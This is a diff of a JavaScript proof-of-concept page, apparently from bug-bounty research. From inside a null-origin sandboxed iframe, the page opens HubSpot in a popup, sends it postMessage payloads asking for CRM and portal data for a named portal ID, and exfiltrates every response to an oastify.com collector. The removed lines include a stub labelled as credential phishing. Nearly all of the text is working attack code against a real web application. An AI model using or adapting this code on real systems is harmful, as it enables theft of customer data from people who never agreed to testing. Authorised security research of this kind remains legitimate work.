@@ -2,11 +2,10 @@
 <html>
 <head><title>Loading</title></head>
 <body>
-<h1>Processing</h1>
+<h1>Processing...</h1>
 <div id="log"></div>
 <script>
 const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-const params = new URLSearchParams(window.location.search);
 
 function log(m) {
     document.getElementById('log').innerHTML += '<br>' + m;
@@ -15,9 +14,9 @@ function log(m) {
 
 log('page_loaded');
 
-// Create sandbox iframe
+// Create sandboxed iframe (this makes origin = null)
 const iframe = document.createElement('iframe');
-iframe.sandbox = 'allow-scripts allow-popups allow-same-origin allow-top-navigation';
+iframe.sandbox = 'allow-scripts allow-popups allow-same-origin';
 iframe.style.cssText = 'width:100%;height:500px;border:2px solid red';
 
 iframe.srcdoc = `
@@ -34,107 +33,79 @@ function log(m) {
     new Image().src = EXFIL + '/?s=' + encodeURIComponent(m);
 }
 
-log('sandbox_origin=' + window.origin);
+log('START_origin=' + window.origin);
 
-// Step 1: Open HubSpot with name containing our script
 log('opening_hubspot');
-let hub = window.open('https://app-eu1.hubspot.com', 'EXPLOIT_MARKER', 'width=800,height=600');
+let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
 
 if (!hub) {
-    log('ERROR_blocked');
+    log('popup_blocked');
 } else {
     log('popup_opened');
     
-    // Step 2: Poll until HubSpot loads
     let attempts = 0;
     let checker = setInterval(() => {
         attempts++;
         
         try {
-            // This will throw when cross-origin
             hub.origin;
             if (attempts % 10 === 0) log('waiting_' + attempts);
         } catch(e) {
             clearInterval(checker);
             log('hubspot_loaded_after_' + attempts);
             
-            // Step 3: Now HubSpot is loaded and cross-origin
-            // Try to send postMessage exploits
+            // Listen for responses from HubSpot
+            window.addEventListener('message', (resp) => {
+                if (resp.source === hub) {
+                    log('RESPONSE_from_hubspot');
+                    const data = JSON.stringify(resp.data).substring(0, 400);
+                    log('response_data=' + data);
+                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(data);
+                }
+            });
             
-            log('sending_postmessage_exploits');
-            
-            // Exploit 1: Content Assistance (no origin check)
-            hub.postMessage({
-                type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                commandId: 'getdata',
-                featureId: 'crm',
-                parameters: {action: 'export', portalId: '46962361'},
-                resultCount: 100,
-                language: 'en',
-                objectId: '46962361',
-                applicationId: 'crm',
-                basePath: '/crm/contacts',
-                maxPollingAttempts: 5,
-                pollingInterval: 200
-            }, '*');
-            
-            // Exploit 2: Raw message
+            // Send exploits
             setTimeout(() => {
+                log('sending_exploit_1');
+                hub.postMessage({
+                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                    commandId: 'getdata',
+                    featureId: 'crm',
+                    parameters: {portalId: '46962361'},
+                    resultCount: 100,
+                    language: 'en',
+                    objectId: '46962361',
+                    applicationId: 'crm',
+                    basePath: '/crm',
+                    maxPollingAttempts: 5,
+                    pollingInterval: 200
+                }, '*');
+            }, 1000);
+            
+            setTimeout(() => {
+                log('sending_exploit_2');
                 hub.postMessage({
                     type: 'raw',
                     _callbackId: 'exploit_' + Date.now(),
                     body: {
-                        action: 'reduxAction',
-                        type: 'GET_PORTAL_DATA',
-                        payload: {portalId: '46962361'}
+                        action: 'getData',
+                        portalId: '46962361'
                     }
                 }, '*');
-            }, 1000);
+            }, 2000);
             
-            // Exploit 3: Try to trigger dark mode (test if null origin bypass works)
             setTimeout(() => {
+                log('sending_exploit_3');
                 hub.postMessage({
                     type: 'TOGGLE_DARK_MODE',
                     isDarkMode: true
                 }, '*');
-            }, 2000);
-            
-            // Listen for ANY responses
-            window.addEventListener('message', (resp) => {
-                if (resp.source === hub) {
-                    log('RESPONSE_from_hubspot');
-                    log('response_type=' + (resp.data.type || 'unknown'));
-                    
-                    // Exfiltrate response
-                    const respStr = JSON.stringify(resp.data).substring(0, 500);
-                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(respStr);
-                    
-                    fetch(EXFIL + '/response', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            origin: resp.origin,
-                            data: resp.data,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                }
-            });
-            
-            // Step 4: Also try to phish for credentials
-            setTimeout(() => {
-                log('attempting_credential_phish');
-                
-                // Navigate popup to a phishing page on OUR domain
-                // But we can't navigate cross-origin popup...
-                // So instead we'll try window.opener trick
-                
-            }, 5000);
+            }, 3000);
         }
         
         if (attempts > 100) {
             clearInterval(checker);
-            log('timeout_after_' + attempts);
+            log('timeout_after_100');
         }
     }, 100);
 }
